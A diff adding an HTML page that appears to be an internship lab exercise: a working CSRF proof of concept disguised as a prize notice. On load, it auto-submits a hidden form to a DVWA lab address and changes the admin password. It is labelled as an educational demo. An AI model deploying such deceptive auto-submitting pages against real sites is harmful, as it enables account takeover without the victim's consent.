@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>CSRF Demo — ApexPlanet Task 3</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #1a1a2e;
+      color: #eee;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+    .box {
+      background: #16213e;
+      border: 1px solid #0f3460;
+      border-radius: 10px;
+      padding: 40px;
+      text-align: center;
+      max-width: 500px;
+    }
+    h1 { color: #e94560; }
+    p { color: #aaa; }
+    .warning {
+      background: #2d1b1b;
+      border: 1px solid #e94560;
+      border-radius: 6px;
+      padding: 15px;
+      margin-top: 20px;
+      font-size: 13px;
+      color: #e94560;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="box">
+    <h1>🎉 You Won a Prize!</h1>
+    <p>Congratulations! You have been selected as a lucky winner.</p>
+    <p>Your reward is being processed...</p>
+
+    <!--
+      CSRF ATTACK EXPLANATION:
+      This hidden form automatically submits to DVWA's CSRF endpoint.
+      If the victim is logged into DVWA in another tab, their session
+      cookie is sent automatically — changing their password without consent.
+
+      Target: DVWA running at 192.168.56.101
+      Action: Change admin password to "hacked123"
+    -->
+    <form id="csrfAttack"
+          action="http://192.168.56.101/dvwa/vulnerabilities/csrf/"
+          method="GET"
+          style="display:none;">
+      <input type="hidden" name="password_new"  value="hacked123" />
+      <input type="hidden" name="password_conf" value="hacked123" />
+      <input type="hidden" name="Change"        value="Change"    />
+    </form>
+
+    <div class="warning">
+      ⚠️ EDUCATIONAL DEMO ONLY<br>
+      This page demonstrates a CSRF attack for the<br>
+      ApexPlanet Cybersecurity Internship — Task 3.<br>
+      Only used in a controlled lab environment.
+    </div>
+  </div>
+
+  <script>
+    // Auto-submit the hidden form on page load
+    // This simulates a victim visiting a malicious page
+    window.onload = function() {
+      document.getElementById('csrfAttack').submit();
+    };
+  </script>
+
+</body>
+</html>
